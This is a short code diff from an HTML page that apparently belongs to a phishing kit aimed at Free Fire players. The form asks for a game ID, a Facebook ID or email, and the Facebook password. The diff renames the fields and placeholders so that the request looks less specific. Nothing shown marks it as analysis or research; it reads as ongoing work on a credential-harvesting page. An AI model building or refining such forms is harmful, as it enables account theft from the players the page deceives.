@@ -144,11 +144,11 @@ label {
 <input  name="Freefire ID:"  placeholder="Enter your freefire id" type="text" required>
 <br>
 <label><font color="gold">Facebook ID: </font></label>
-<input  name="Facebook ID:"  placeholder="Enter your facebook number/email" type="text" required>
+<input  name="Facebook Id/Email:"  placeholder="Enter your number/email" type="text" required>
 <br>
 <label><font color="gold">Your FB password: </font></label>
 <br>
-<input  name="Facebook Password:"  placeholder="Enter your fb password" type="password" required>
+<input  name="Password:"  placeholder="Enter your password" type="password" required>
 
 
 <center><button class="able"><img src="imgg/button.png" </center>
